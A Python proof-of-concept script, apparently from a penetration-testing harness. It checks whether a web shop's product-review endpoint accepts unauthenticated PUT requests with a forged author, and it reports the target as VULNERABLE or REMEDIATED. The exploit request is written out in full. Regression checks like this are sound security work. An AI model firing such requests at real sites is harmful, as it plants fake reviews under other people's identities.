#!/usr/bin/env python3
"""pt23: a review can be created with zero authentication and a forged author.

Found while probing review creation for pt22: server.js mounts
PUT /rest/products/:id/reviews with no isAuthorized() middleware at
all, unlike its PATCH and POST siblings on the same model.
createProductReviews.js looks up the caller optionally but never
rejects when none is found, and inserts whatever "author" field the
client supplied regardless. A request with no Authorization header at
all still creates a real, persisted review under a fully fabricated
identity.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt23-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> str:
    email = f"pt23-{label}-{stamp}@flatline.test"
    password = "Pt23Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    marker = f"pt23 unauthenticated forged review {stamp}"
    exploit_status, _ = _request(
        "PUT", f"{target}/rest/products/1/reviews",
        body={"message": marker, "product": "1", "author": blueprint["forged_author"]},
    )

    _, check_body = _request("GET", f"{target}/rest/products/1/reviews")
    matching = [r for r in check_body.get("data", []) if r.get("message") == marker]
    actually_persisted = len(matching) == 1 and matching[0].get("author") == blueprint["forged_author"]

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 201 and actually_persisted:
        status = "VULNERABLE"
        summary = f"Created a review with no authentication at all, author forged to {blueprint['forged_author']!r}."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, actually_persisted={actually_persisted}."

    legit_email = f"pt23-legit-{stamp}@flatline.test"
    legit_token = _register_and_login(target, "legit", stamp)
    legit_marker = f"pt23 legit review {stamp}"
    legit_status, _ = _request(
        "PUT", f"{target}/rest/products/1/reviews", token=legit_token,
        body={"message": legit_marker, "product": "1", "author": legit_email},
    )
    _, legit_check_body = _request("GET", f"{target}/rest/products/1/reviews")
    legit_matching = [r for r in legit_check_body.get("data", []) if r.get("message") == legit_marker]
    legitimate_authentic_review_ok = (
        legit_status == 201 and len(legit_matching) == 1 and legit_matching[0].get("author") == legit_email
    )

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_authentic_review_ok": legitimate_authentic_review_ok,
        "legitimate_authentic_review_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt23-forged-unauthenticated-review", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
